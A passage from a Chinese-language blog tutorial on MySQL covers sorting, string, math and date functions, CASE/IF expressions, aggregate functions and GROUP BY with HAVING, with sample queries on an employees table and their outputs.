class="line">案例六:查询员工信息，要求先按照员工工资排序，再按员工编号排序【按多个字段排序】</span><br><span class="line">mysql&gt; SELECT * FROM employees ORDER BY salary ASC,employee_id DESC;</span><br></pre></td></tr></table></figure>

<h3 id="常见函数"><a href="#常见函数" class="headerlink" title="常见函数"></a>常见函数</h3><h5 id="概念-将一组逻辑语句封装在方法体中，对外暴露方法名"><a href="#概念-将一组逻辑语句封装在方法体中，对外暴露方法名" class="headerlink" title="概念:将一组逻辑语句封装在方法体中，对外暴露方法名"></a>概念:将一组逻辑语句封装在方法体中，对外暴露方法名</h5><h5 id="好处-1、隐藏了函数实现细节-2、提高了代码的重用性"><a href="#好处-1、隐藏了函数实现细节-2、提高了代码的重用性" class="headerlink" title="好处:1、隐藏了函数实现细节    2、提高了代码的重用性"></a>好处:1、隐藏了函数实现细节    2、提高了代码的重用性</h5><h5 id="调用-select-函数名-实参列表-【form-表】"><a href="#调用-select-函数名-实参列表-【form-表】" class="headerlink" title="调用: select 函数名(实参列表) 【form 表】;"></a>调用: select 函数名(实参列表) 【form 表】;</h5><h5 id="特点-2"><a href="#特点-2" class="headerlink" title="特点:"></a>特点:</h5><h5 id="函数名"><a href="#函数名" class="headerlink" title="函数名"></a>函数名</h5><h5 id="函数功能"><a href="#函数功能" class="headerlink" title="函数功能"></a>函数功能</h5><h5 id="分类"><a href="#分类" class="headerlink" title="分类:"></a>分类:</h5><h5 id="1、单行函数"><a href="#1、单行函数" class="headerlink" title="1、单行函数"></a>1、单行函数</h5><h5 id="如-concat、length、ifnull等"><a href="#如-concat、length、ifnull等" class="headerlink" title="如: concat、length、ifnull等"></a>如: concat、length、ifnull等</h5><h5 id="2、分组函数"><a href="#2、分组函数" class="headerlink" title="2、分组函数"></a>2、分组函数</h5><h5 id="功能：做统计使用，又称为统计函数、聚合函数、组函数"><a href="#功能：做统计使用，又称为统计函数、聚合函数、组函数" class="headerlink" title="功能：做统计使用，又称为统计函数、聚合函数、组函数"></a>功能：做统计使用，又称为统计函数、聚合函数、组函数</h5><h3 id="单行函数"><a href="#单行函数" class="headerlink" title="单行函数"></a>单行函数</h3><h4 id="单行函数-1"><a href="#单行函数-1" class="headerlink" title="单行函数:"></a>单行函数:</h4><ul>
<li><h5 id="字符函数"><a href="#字符函数" class="headerlink" title="字符函数"></a>字符函数</h5></li>
<li><h5 id="数学函数"><a href="#数学函数" class="headerlink" title="数学函数"></a>数学函数</h5></li>
<li><h5 id="日期函数"><a href="#日期函数" class="headerlink" title="日期函数"></a>日期函数</h5></li>
<li><h5 id="其他函数【补充】"><a href="#其他函数【补充】" class="headerlink" title="其他函数【补充】"></a>其他函数【补充】</h5></li>
<li><h5 id="流程控制函数【补充】"><a href="#流程控制函数【补充】" class="headerlink" title="流程控制函数【补充】"></a>流程控制函数【补充】</h5></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">单行函数</span><br><span class="line">总结:</span><br><span class="line">	字符函数:</span><br><span class="line">	length (获取字节长度)</span><br><span class="line">	concat(拼接字符)</span><br><span class="line">	upper(将字母大写)</span><br><span class="line">	lower(将字母小写)</span><br><span class="line">	substr(索引)</span><br><span class="line">	instr(返回第一次索引的位置)</span><br><span class="line">	trim(去除开头和结尾)</span><br><span class="line">	lpad(用指定字符实现左填充)</span><br><span class="line">	rpad(用指定字符实现右填充)</span><br><span class="line">	replace(替换)</span><br><span class="line">数学函数:</span><br><span class="line">	round(四舍五入)</span><br><span class="line">	ceil(向上取整)</span><br><span class="line">	floor(向下取整)</span><br><span class="line">	truncate(截断)</span><br><span class="line">	mod(取余)</span><br><span class="line">	rand(获取随机数)，返回0-1之间的小数，无限接近于1但到不了1</span><br><span class="line">日期函数:</span><br><span class="line">	now(返回当前日期和时间)</span><br><span class="line">	curdate(返回当前日期)</span><br><span class="line">	curtime(返回当前时间)</span><br><span class="line">	year(年)</span><br><span class="line">	month(月)</span><br><span class="line">	day(日)</span><br><span class="line">	hour(小时)</span><br><span class="line">	minute(分钟)</span><br><span class="line">	second(秒)</span><br><span class="line">	str_to_date(将字符通过指定的格式转换成日期)</span><br><span class="line">	date_format(将日期转换成字符)</span><br><span class="line">	ditediff(两个日期相差的天数)</span><br><span class="line">	monthname(以英文形式返回月)</span><br><span class="line">其他函数:</span><br><span class="line">	version(查看当前系统版本)</span><br><span class="line">	datebase(查看当前库名)</span><br><span class="line">	user(查看当前用户)</span><br><span class="line">	password(&#39;字符&#39;):返回该字符的密码形式，也就是自动加密</span><br><span class="line">	md5(&#39;字符&#39;):返回md5加密形式</span><br><span class="line">流程控制函数：</span><br><span class="line">	if(类似于if else)</span><br><span class="line">	case(类似于 swith default)</span><br></pre></td></tr></table></figure>



<h5 id="一、字符函数"><a href="#一、字符函数" class="headerlink" title="一、字符函数"></a>一、字符函数</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、length 获取参数值的字节个数</span><br><span class="line">mysql&gt; SELECT LENGTH(&#39;john&#39;);</span><br><span class="line"></span><br><span class="line">2、concat 拼接字符串</span><br><span class="line">mysql&gt; SELECT CONCAT(last_name,&#39;_&#39;,first_name) FROM employees;</span><br><span class="line"></span><br><span class="line">3、upper、lower  upper将想写变成大写，lower是将大写变成小写</span><br><span class="line">mysql&gt; SELECT UPPER(&#39;joke&#39;);</span><br><span class="line">mysql&gt; SELECT LOWER(&#39;jokE&#39;);</span><br><span class="line">示例:将姓大写，名小写，然后拼接</span><br><span class="line">mysql</span><br><span class="line">&gt; SELECT CONCAT(UPPER(last_name),LOWER(first_name)) 姓名 FROM employees;</span><br><span class="line"></span><br><span class="line">4、substr、substring	索引</span><br><span class="line">注意:索引是从1开始的，截取指定索引处后面所有的字符</span><br><span class="line">mysql&gt; SELECT SUBSTR(&#39;世间美好与你环环相扣&#39;,5) out_put;</span><br><span class="line"></span><br><span class="line">截取从指定索引处指定字符长度的字符</span><br><span class="line">mysql&gt; SELECT SUBSTR(&#39;世间美好与你环环相扣&#39;，1,4) out_put;</span><br><span class="line"></span><br><span class="line">案例:姓名中首字符大写，其他字符小写，然后用_拼接，显示出来</span><br><span class="line">mysql&gt; SELECT CONCAT(UPPER(SUBSTR(last_name,1,1)),&#39;_&#39;,LOWER(SUBSTR(last_name,2))) out_put FROM employees;</span><br><span class="line"></span><br><span class="line">5、instr	返回子串第一次出现的索引，如果找不到返回0</span><br><span class="line">mysql&gt; SELECT INSTR(&#39;杨过和小龙女&#39;,&#39;小龙女&#39;) out_put;</span><br><span class="line">+---------+</span><br><span class="line">| out_put |</span><br><span class="line">+---------+</span><br><span class="line">|       4 |</span><br><span class="line">+---------+</span><br><span class="line"></span><br><span class="line">6、trim</span><br><span class="line">注意:trim只能去除开头和结尾，中间不能去除</span><br><span class="line">mysql&gt; SELECT TRIM(&#39;     皮卡丘     &#39;) out_put;</span><br><span class="line">+---------+</span><br><span class="line">| out_put |</span><br><span class="line">+---------+</span><br><span class="line">| 皮卡丘       |</span><br><span class="line">+---------+</span><br><span class="line"></span><br><span class="line">#可以加上length来查看字符长度，看看是否将空格去除了</span><br><span class="line">mysql&gt; SELECT LENGTH(TRIM(&#39;      皮卡丘      &#39;)) out_put;</span><br><span class="line">+---------+</span><br><span class="line">| out_put |</span><br><span class="line">+---------+</span><br><span class="line">|       6 |</span><br><span class="line">+---------+</span><br><span class="line"></span><br><span class="line">案例一、aaaaaaa皮卡丘aaaaaaaa将a去除，只显示皮卡丘</span><br><span class="line"># 只需要在前面加上你想要去掉的符号就可以</span><br><span class="line">mysql&gt; SELECT TRIM(&#39;a&#39; FROM &#39;aaaaaaa皮卡丘aaaaaaaa&#39;) out_put;</span><br><span class="line">+---------+</span><br><span class="line">| out_put |</span><br><span class="line">+---------+</span><br><span class="line">| 皮卡丘       |</span><br><span class="line">+---------+</span><br><span class="line"></span><br><span class="line">7、lpad  用指定字符实现左填充指定长度</span><br><span class="line">mysql&gt; SELECT LPAD(&#39;小智&#39;,10,&#39;*&#39;) out_put;</span><br><span class="line">+--------------+</span><br><span class="line">| out_put      |</span><br><span class="line">+--------------+</span><br><span class="line">| ********小智    |</span><br><span class="line">+--------------+</span><br><span class="line"></span><br><span class="line">8、rpad  用指定字符实现右填充指定长度</span><br><span class="line">mysql&gt; SELECT RPAD(&#39;小智&#39;,10,&#39;*&#39;) out_put;</span><br><span class="line">+--------------+</span><br><span class="line">| out_put      |</span><br><span class="line">+--------------+</span><br><span class="line">| 小智********    |</span><br><span class="line">+--------------+</span><br><span class="line"></span><br><span class="line">9、replace  替换</span><br><span class="line">#将周芷若替换成了赵敏</span><br><span class="line">mysql&gt; SELECT REPLACE(&#39;张无忌爱上了周芷若&#39;,&#39;周芷若&#39;,&#39;赵敏&#39;) AS out_put;</span><br><span class="line">+------------------+</span><br><span class="line">| out_put          |</span><br><span class="line">+------------------+</span><br><span class="line">| 张无忌爱上了赵敏               |</span><br><span class="line">+------------------+</span><br></pre></td></tr></table></figure>

<h5 id="二、数学函数"><a href="#二、数学函数" class="headerlink" title="二、数学函数"></a>二、数学函数</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、round  四舍五入</span><br><span class="line">mysql&gt; SELECT ROUND(4.6) number;</span><br><span class="line"></span><br><span class="line">2、ceil  向上取整，返回&gt;&#x3D;该参数的最小整数</span><br><span class="line">mysql&gt; SELECT CEIL(1.0000002) AS number;</span><br><span class="line">+--------+</span><br><span class="line">| number |</span><br><span class="line">+--------+</span><br><span class="line">|      2 |</span><br><span class="line">+--------+</span><br><span class="line"></span><br><span class="line">3、floor  向下取整，返回&lt;&#x3D;该参数的最大整数</span><br><span class="line">mysql&gt; SELECT FLOOR(1.0000002) AS number;</span><br><span class="line">+--------+</span><br><span class="line">| number |</span><br><span class="line">+--------+</span><br><span class="line">|      1 |</span><br><span class="line">+--------+</span><br><span class="line"></span><br><span class="line">4、truncate  截断</span><br><span class="line"># 4 表示保留小数点后几位</span><br><span class="line">mysql&gt; SELECT TRUNCATE(3.1415926,4) AS number;</span><br><span class="line">+--------+</span><br><span class="line">| number |</span><br><span class="line">+--------+</span><br><span class="line">| 3.1415 |</span><br><span class="line">+--------+</span><br><span class="line"></span><br><span class="line">5、mod  取余</span><br><span class="line">mysql&gt; SELECT MOD(10,8) AS number;</span><br><span class="line">+--------+</span><br><span class="line">| number |</span><br><span class="line">+--------+</span><br><span class="line">|      2 |</span><br><span class="line">+--------+</span><br></pre></td></tr></table></figure>

<h5 id="三、日期函数"><a href="#三、日期函数" class="headerlink" title="三、日期函数"></a>三、日期函数</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、now 返回当前系统+日期</span><br><span class="line">mysql&gt; SELECT NOW();</span><br><span class="line">+---------------------+</span><br><span class="line">| NOW()               |</span><br><span class="line">+---------------------+</span><br><span class="line">| 2020-02-05 15:09:28 |</span><br><span class="line">+---------------------+</span><br><span class="line"></span><br><span class="line">2、curdate  放回当前系统日期，不包含时间</span><br><span class="line">mysql&gt; SELECT CURDATE();</span><br><span class="line">+------------+</span><br><span class="line">| CURDATE()  |</span><br><span class="line">+------------+</span><br><span class="line">| 2020-02-05 |</span><br><span class="line">+------------+</span><br><span class="line"></span><br><span class="line">3、curtime 返回当前系统时间，不包含日期</span><br><span class="line">mysql&gt; SELECT CURTIME();</span><br><span class="line">+-----------+</span><br><span class="line">| CURTIME() |</span><br><span class="line">+-----------+</span><br><span class="line">| 15:21:07  |</span><br><span class="line">+-----------+</span><br><span class="line"></span><br><span class="line">4、可以获取指定的部分，年、月、日、小时、分钟、秒</span><br><span class="line"># 年(year)、月(month)、日(day)、小时(hour)、分钟(Minute)、秒(second)</span><br><span class="line">mysql&gt; SELECT YEAR(NOW());</span><br><span class="line">+-------------+</span><br><span class="line">| YEAR(NOW()) |</span><br><span class="line">+-------------+</span><br><span class="line">|        2020 |</span><br><span class="line">+-------------+</span><br><span class="line"></span><br><span class="line">5、str_to_date 将字符通过指定的格式转换成日期</span><br><span class="line">mysql&gt; SELECT STR_TO_DATE(&#39;2020-23-2&#39;,&#39;%Y-%d-%c&#39;);</span><br><span class="line">+-------------------------------------+</span><br><span class="line">| STR_TO_DATE(&#39;2020-23-2&#39;,&#39;%Y-%d-%c&#39;) |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">| 2020-02-23                          |</span><br><span class="line">+-------------------------------------+</span><br><span class="line"></span><br><span class="line">案例一:查询入职时间为1992-4-3的员工信息</span><br><span class="line">mysql&gt; SELECT hiredate FROM employees WHERE hiredate &#x3D; STR_TO_DATE(&#39;4-3-1992&#39;,&#39;%c-%d-%Y&#39;);</span><br><span class="line">+---------------------+</span><br><span class="line">| hiredate            |</span><br><span class="line">+---------------------+</span><br><span class="line">| 1992-04-03 00:00:00 |</span><br><span class="line">| 1992-04-03 00:00:00 |</span><br><span class="line">| 1992-04-03 00:00:00 |</span><br><span class="line">| 1992-04-03 00:00:00 |</span><br><span class="line">| 1992-04-03 00:00:00 |</span><br><span class="line">+---------------------+</span><br><span class="line"></span><br><span class="line">date_format:将日期转换成字符</span><br><span class="line">mysql&gt; SELECT DATE_FORMAT(&#39;2020&#x2F;2&#x2F;5&#39;,&#39;%Y年%m月%d日&#39;);</span><br><span class="line">+----------------------------------------+</span><br><span class="line">| DATE_FORMAT(&#39;2020&#x2F;2&#x2F;5&#39;,&#39;%Y年%m月%d日&#39;)       |</span><br><span class="line">+----------------------------------------+</span><br><span class="line">| 2020年02月05日                               |</span><br><span class="line">+----------------------------------------+</span><br><span class="line"></span><br><span class="line">案例一:查询有奖金的员工名和入职日期(××月&#x2F;××日 ××年)</span><br><span class="line">mysql&gt; SELECT last_name,DATE_FORMAT(hiredate,&#39;%m月%d日 %y年&#39;) FROM employees WHERE commission_pct IS NOT NULL;</span><br><span class="line">+------------+---------------------------------------+</span><br><span class="line">| last_name  | DATE_FORMAT(hiredate,&#39;%m月%d日 %y年&#39;)       |</span><br><span class="line">+------------+---------------------------------------+</span><br><span class="line">| Russell    | 12月23日 02年                               |</span><br><span class="line">| Partners   | 12月23日 02年                               |</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/1581511994303.png" alt="1580887767466"></p>
<h5 id="四、其他函数"><a href="#四、其他函数" class="headerlink" title="四、其他函数"></a>四、其他函数</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select version();  查看当前版本</span><br><span class="line">select datebase(); 查看当前数据库</span><br><span class="line">select user();  代表当前用户</span><br></pre></td></tr></table></figure>

<h5 id="五、流程控制函数"><a href="#五、流程控制函数" class="headerlink" title="五、流程控制函数"></a>五、流程控制函数</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、if函数: 类似于 if else 的效果</span><br><span class="line"></span><br><span class="line">#括号里面的数值，第一个是条件表达式，如果条件成立输出第二个，如果不成立，输出第三个</span><br><span class="line">10&gt;2成立，输出  大 </span><br><span class="line">mysql&gt; select if(10&gt;2,&#39;大&#39;,&#39;小&#39;);</span><br><span class="line"># 10&lt;2条件不成立，输出 小</span><br><span class="line">mysql&gt; select if(10&lt;2,&#39;大&#39;,&#39;小&#39;);</span><br><span class="line"></span><br><span class="line">案例一:将有奖金的员工名打印有，没有奖金的打印无</span><br><span class="line">mysql&gt; select last_name,commission_pct,if(commission_pct is null,&#39;无&#39;,&#39;有&#39;) 奖金 from employees;</span><br><span class="line"></span><br><span class="line">2、case函数的使用方法一	大部分用于等值判断</span><br><span class="line">在when中值不需要加;分号，语句需要加;分号</span><br><span class="line">&#x2F;*</span><br><span class="line">语法:</span><br><span class="line">    case 要判断的字段或表达式</span><br><span class="line">    when 常量1 then 要显示的值1或语句1;</span><br><span class="line">    when 常量2 then 要显示的值2或语句2;</span><br><span class="line">    ...</span><br><span class="line">    else 要显示的值n或语句n;</span><br><span class="line">    end</span><br><span class="line">*&#x2F;</span><br><span class="line"></span><br><span class="line">案例:查询员工的工资，要求:</span><br><span class="line">部门号&#x3D;30，显示工资1.1倍</span><br><span class="line">部门号&#x3D;40，显示工资1.2倍</span><br><span class="line">部门号&#x3D;50，显示工资1.3倍</span><br><span class="line">其他部门，显示工资为原工资</span><br><span class="line">mysql&gt; select salary,department_id,</span><br><span class="line">    -&gt; case department_id</span><br><span class="line">    -&gt; when 30 then salary*1.1</span><br><span class="line">    -&gt; when 40 then salary*1.2</span><br><span class="line">    -&gt; when 50 then salary*1.3</span><br><span class="line">    -&gt; else salary</span><br><span class="line">    -&gt; end as 新工资</span><br><span class="line">    -&gt; from employees;</span><br><span class="line">+----------+---------------+----------+</span><br><span class="line">| salary   | department_id | 新工资        |</span><br><span class="line">+----------+---------------+----------+</span><br><span class="line">| 24000.00 |            90 | 24000.00 |</span><br><span class="line">| 17000.00 |            90 | 17000.00 |</span><br><span class="line">| 17000.00 |            90 | 17000.00 |</span><br><span class="line">|  9000.00 |            60 |  9000.00 |</span><br><span class="line">|  6000.00 |            60 |  6000.00 |</span><br><span class="line"></span><br><span class="line">3、case 函数的使用二	大部分用于判断大于小于</span><br><span class="line">&#x2F;*</span><br><span class="line">语法:</span><br><span class="line">    case </span><br><span class="line">    when 条件1 then 要显示的值1</span><br><span class="line">    when 条件2 then 要显示的值2</span><br><span class="line">    ...</span><br><span class="line">    else 要显示的值n或语句n;</span><br><span class="line">    end</span><br><span class="line">*&#x2F;</span><br><span class="line">案例一:查询员工的工资情况</span><br><span class="line">如果工资&gt;20000,显示A级别</span><br><span class="line">如果工资&gt;15000,显示B级别</span><br><span class="line">如果工资&gt;10000,显示C级别</span><br><span class="line">其他显示D级别</span><br><span class="line">mysql&gt; select salary,</span><br><span class="line">    -&gt; case</span><br><span class="line">    -&gt; when salary&gt;20000 then &#39;A&#39;</span><br><span class="line">    -&gt; when salary&gt;15000 then &#39;B&#39;</span><br><span class="line">    -&gt; when salary&gt;10000 then &#39;C&#39;</span><br><span class="line">    -&gt; else &#39;D&#39;</span><br><span class="line">    -&gt; end as 工资级别</span><br><span class="line">    -&gt; from employees;</span><br><span class="line">+----------+----------+</span><br><span class="line">| salary   | 工资级别        |</span><br><span class="line">+----------+----------+</span><br><span class="line">| 24000.00 | A        |</span><br><span class="line">| 17000.00 | B        |</span><br><span class="line">|  9000.00 | D        |</span><br><span class="line">| 12000.00 | C        |</span><br></pre></td></tr></table></figure>

<h4 id="分组函数"><a href="#分组函数" class="headerlink" title="分组函数"></a>分组函数</h4><h5 id="功能-用作统计使用，又成为聚合函数或统计函数或组函数"><a href="#功能-用作统计使用，又成为聚合函数或统计函数或组函数" class="headerlink" title="功能:用作统计使用，又成为聚合函数或统计函数或组函数"></a>功能:用作统计使用，又成为聚合函数或统计函数或组函数</h5><h5 id="分类-1"><a href="#分类-1" class="headerlink" title="分类:"></a>分类:</h5><h5 id="sum-求和、avg-平均值、max-最大值、min-最小值、count-计算个数"><a href="#sum-求和、avg-平均值、max-最大值、min-最小值、count-计算个数" class="headerlink" title="sum 求和、avg 平均值、max 最大值、min 最小值、count 计算个数"></a>sum 求和、avg 平均值、max 最大值、min 最小值、count 计算个数</h5><h5 id="特点-3"><a href="#特点-3" class="headerlink" title="特点:"></a>特点:</h5><h5 id="1、sum、avg-一般用于处理数值型"><a href="#1、sum、avg-一般用于处理数值型" class="headerlink" title="1、sum、avg 一般用于处理数值型"></a>1、sum、avg 一般用于处理数值型</h5><h5 id="max、min、count可以处理任何类型"><a href="#max、min、count可以处理任何类型" class="headerlink" title="max、min、count可以处理任何类型"></a>max、min、count可以处理任何类型</h5><h5 id="2、以上分组函数都忽略null值"><a href="#2、以上分组函数都忽略null值" class="headerlink" title="2、以上分组函数都忽略null值"></a>2、以上分组函数都忽略null值</h5><h5 id="3、可以和distinct搭配是去重运算-select-sum-distinct-字段-from-表"><a href="#3、可以和distinct搭配是去重运算-select-sum-distinct-字段-from-表" class="headerlink" title="3、可以和distinct搭配是去重运算      select sum(distinct 字段) from 表"></a>3、可以和distinct搭配是去重运算      select sum(distinct 字段) from 表</h5><h5 id="4、count函数的单独介绍，一般使用count-用作统计行数"><a href="#4、count函数的单独介绍，一般使用count-用作统计行数" class="headerlink" title="4、count函数的单独介绍，一般使用count()用作统计行数"></a>4、count函数的单独介绍，一般使用count()用作统计行数</h5><h5 id="5、和分组函数一同查询的字段要求是group-by后的字段"><a href="#5、和分组函数一同查询的字段要求是group-by后的字段" class="headerlink" title="5、和分组函数一同查询的字段要求是group by后的字段"></a>5、和分组函数一同查询的字段要求是group by后的字段</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、简单的使用</span><br><span class="line">mysql&gt; select sum(salary) from employees; #salary的全部和</span><br><span class="line">mysql&gt; select avg(salary) from employees; #salary的平均值</span><br><span class="line">mysql&gt; select max(salary) from employees; #salary的最大值</span><br><span class="line">mysql&gt; select min(salary) from employees; #salary的最小值</span><br><span class="line">mysql&gt; select count(salary) from employees; #计算有多少个salary</span><br><span class="line"></span><br><span class="line">可以将函数一起使用</span><br><span class="line">mysql&gt; select sum(salary) 和,avg(salary) 平均,max(salary) 最大,min(salary) 最小,count(salary) 个数 from employees;</span><br><span class="line"></span><br><span class="line">2、参数支持那些类型</span><br><span class="line">sum、avg一般用于处理数值型</span><br><span class="line">max、min、count可以处理任何类型</span><br><span class="line">   </span><br><span class="line">mysql&gt; select sum(salary),avg(salary) from employees;</span><br><span class="line">mysql&gt; select max(last_name),min(salary),count(last_name) from employees;</span><br><span class="line"></span><br><span class="line">3、是否忽略null值</span><br><span class="line">以上分组函数都忽略null值</span><br><span class="line">mysql&gt; select sum(commission_pct),avg(commission_pct) from employees;</span><br><span class="line">mysql&gt; select max(commission_pct),min(commission_pct) from employees;</span><br><span class="line">mysql&gt; select count(commission_pct) from employees;</span><br><span class="line"></span><br><span class="line">4、和distinct的搭配</span><br><span class="line">其他分组函数全都支持distinct去重</span><br><span class="line">mysql&gt; select sum(distinct salary),sum(salary) from employees;</span><br><span class="line">+----------------------+-------------+</span><br><span class="line">| sum(distinct salary) | sum(salary) |</span><br><span class="line">+----------------------+-------------+</span><br><span class="line">|            397900.00 |   691400.00 |</span><br><span class="line">+----------------------+-------------+</span><br><span class="line"></span><br><span class="line">计算有几个工资，去重之后是57个原始的个数是107个</span><br><span class="line">mysql&gt; select count(distinct salary),count(salary) from employees;</span><br><span class="line">+------------------------+---------------+</span><br><span class="line">| count(distinct salary) | count(salary) |</span><br><span class="line">+------------------------+---------------+</span><br><span class="line">|                     57 |           107 |</span><br><span class="line">+------------------------+---------------+</span><br><span class="line"></span><br><span class="line">5、count函数详细介绍</span><br><span class="line">#统计行数也就是个数</span><br><span class="line">mysql&gt; select count(*) from employees;</span><br><span class="line">#和以上方法意思相同</span><br><span class="line">mysql&gt; select count(1) from employees;</span><br><span class="line"></span><br><span class="line">效率:</span><br><span class="line">5.5版本之前用myisam存储引擎下，count(*)的效率高</span><br><span class="line">5.5版本之后用innodb存储引擎下，count(*)和count(1)效率差不多，但比count(字段)要高，如果里面加字段，他会进行一个判断，判断是否为null如果为null不加1</span><br><span class="line"></span><br><span class="line">6、和分组函数一同查询的字段有限制</span><br><span class="line">#虽然语法没报错但是它的employee_id是错误的</span><br><span class="line">mysql&gt; select avg(salary),employee_id from employees;</span><br><span class="line">+-------------+-------------+</span><br><span class="line">| avg(salary) | employee_id |</span><br><span class="line">+-------------+-------------+</span><br><span class="line">| 6461.682243 |         100 |</span><br><span class="line">+-------------+-------------+</span><br></pre></td></tr></table></figure>

<h4 id="分组查询"><a href="#分组查询" class="headerlink" title="分组查询"></a>分组查询</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">特点：</span><br><span class="line">	1、分组查询中的筛选条件分为两类</span><br><span class="line"> 	分组前筛选	原始表		它的位置是在group by 子句的前面		关键字是where</span><br><span class="line"> 	分组后筛选	分组后的结果集		它的位置是在group by 子句的后面	关键字是having</span><br><span class="line"> 		①分组函数做条件一定是放在having子句中</span><br><span class="line"> 		②能用分组前筛选的，就优先考虑使用分组前筛选</span><br><span class="line"> 2、group by子句支持单个字段分组、多个字段分组(多个字段之间用&quot;,&quot;逗号隔开没有顺寻要求)，表达式或函数(用得较少)</span><br><span class="line"> 3、也可以添加排序(排序放在整个分段查询的最后)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">语法:</span><br><span class="line">​	select 分组函数,字段(要求出现在group by的后面)</span><br><span class="line">​	from 表名</span><br><span class="line">​	【where 筛选条件】</span><br><span class="line">​	group by 分组的列表</span><br><span class="line">​	【order by 子句】</span><br><span class="line"></span><br><span class="line">注意:  370</span><br><span class="line">	查询列表必须特殊，要求是分组函数和group by后出现的字段</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">简单的分组查询</span><br><span class="line"></span><br><span class="line">案例一:查询每个工种的最高工资</span><br><span class="line">mysql&gt; select max(salary),job_id</span><br><span class="line">    -&gt; from employees</span><br><span class="line">    -&gt; group by job_id;</span><br><span class="line">    </span><br><span class="line">案例二:查询每个位置上的部门个数</span><br><span class="line">mysql&gt; select count(*),location_id</span><br><span class="line">    -&gt; from departments</span><br><span class="line">    -&gt; group by location_id;</span><br><span class="line">    </span><br><span class="line">添加分组前的筛选条件</span><br><span class="line">案例一: 查询邮箱中包含a字符的，每个部门的平均工资</span><br><span class="line">mysql&gt; select avg(salary),department_id</span><br><span class="line">    -&gt; from employees</span><br><span class="line">    -&gt; where email like &#39;%a%&#39;</span><br><span class="line">    -&gt; group by department_id;</span><br><span class="line"></span><br><span class="line">案例二:查询有奖金的每个领导手下员工的最高工资</span><br><span class="line">mysql&gt; select max(salary),manager_id</span><br><span class="line">    -&gt; from employees</span><br><span class="line">    -&gt; where commission_pct is not null</span><br><span class="line">    -&gt; group by manager_id;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">添加分组后的的筛选条件</span><br><span class="line">案例一:查询哪个部门的员工表个数&gt;2</span><br><span class="line">mysql&gt; select count(*),department_id</span><br><span class="line">    -&gt; from employees</span><br><span class="line">    -&gt; group by department_id</span><br><span class="line">    -&gt; having count(*)&gt;2;</span><br><span class="line">+----------+---------------+</span><br><span class="line">| count(*) | department_id |</span><br><span class="line">+----------+---------------+</span><br><span class="line">|        6 |            30 |</span><br><span class="line">|       45 |            50 |</span><br><span class="line">|        5 |            60 |</span><br><span class="line">|       34 |            80 |</span><br><span class="line">|        3 |            90 |</span><br><span class="line">|        6 |           100 |</span><br><span class="line">+----------+---------------+  </span><br><span class="line"></span><br><span class="line">案例二:查询每个工种有奖金的员工的最高工资&gt;12000的工种编号和最高工资</span><br><span class="line">mysql&gt; select max(salary),job_id</span><br><span class="line">    -&gt; from employees</span><br><span class="line">    -&gt; where commission_pct is not null</span><br><span class="line">    -&gt; group by job_id</span><br><span class="line">    -&gt; having max(salary)&gt;12000;</span><br><span class="line">+-------------+--------+</span><br><span class="line">| max(salary) | job_id |</span><br><span class="line">+-------------+--------+</span><br><span class="line">|    14000.00 | SA_MAN |</span><br><span class="line">+-------------+--------+</span><br><span class="line"></span><br><span class="line">案例三:查询领导编号&gt;102的每个领导手下的最低工资&gt;5000的领导编号是那个，以及其最低工资</span><br><span class="line">mysql&gt; select min(salary),manager_id</span><br><span class="line">    -&gt; from employees</span><br><span class="line">    -&gt; where manager_id&gt;102</span><br><span class="line">    -&gt; group by manager_id</span><br><span class="line">    -&gt; having min(salary)&gt;5000;</span><br><span class="line">+-------------+------------+</span><br><span class="line">| min(salary) | manager_id |</span><br><span class="line">+-------------+------------+</span><br><span class="line">|     6900.00 |        108 |</span><br><span class="line">|     7000.00 |        145 |</span><br><span class="line">|     7000.00 |        146 |</span><br><span class="line">|     6200.00 |        147 |</span><br><span class="line">|     6100.00 |        148 |</span><br><span class="line">|     6200.00 |        149 |</span><br><span class="line">|     6000.00 |        201 |</span><br><span class="line">|     8300.00 |        205 |</span><br><span class="line">+-------------+------------+</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">按表达式或函数分组</span><br><span class="line"></span><br><span class="line">案例:员工姓名的长度分组，查询每一组的员工个数，筛选员工个数大于5的有哪些</span><br><span class="line">mysql&gt; select count(*),length(last_name)</span><br><span class="line">    -&gt; from employees</span><br><span class="line">    -&gt; group by length(last_name)</span><br><span class="line">    -&gt; having count(*)&gt;5;    </span><br><span class="line">+----------+-------------------+</span><br><span class="line">| count(*) | length(last_name) |</span><br><span class="line">+----------+-------------------+</span><br><span class="line">|       11 |                 4 |</span><br><span class="line">|       29 |                 5 |</span><br><span class="line">|       28 |                 6 |</span><br><span class="line">|       15 |                 7 |</span><br><span class="line">|        7 |                 8 |</span><br><span class="line">|        8 |                 9 |</span><br><span class="line">+----------+-------------------+</span><br><span class="line">按多个字段分组</span><br><span class="line">案例:查询每个部门每个工种的员工的平均工资</span><br><span class="line">mysql&gt; select avg(salary),department_id,job_id</span><br><span class="line">    -&gt; from employees</span><br><span class="line">    -&gt; group by department_id,job_id;</span><br><span class="line">+--------------+---------------+------------+</span><br><span class="line">| avg(salary)  | department_id | job_id     |</span><br><span class="line">+--------------+---------------+------------+</span><br><span class="line">|  7000.000000 |          NULL | SA_REP     |</span><br><span class="line">|  4400.000000 |            10 | AD_ASST    |</span><br><span class="line">| 13000.000000 |            20 | MK_MAN     |</span><br><span class="line">    </span><br><span class="line">添加排序</span><br><span class="line">案例:查询每个部门每个工种的员工的平均工资，并且按平均工资的高低显示</span><br><span class="line">mysql&gt; select avg(salary),department_id,job_id</span><br><span class="line">    -&gt; from employees</span><br><span class="line">    -&gt; group by department_id,job_id</span><br><span class="line">    -&gt; order by avg(salary) desc;</span><br><span class="line">+--------------+---------------+------------+</span><br><span 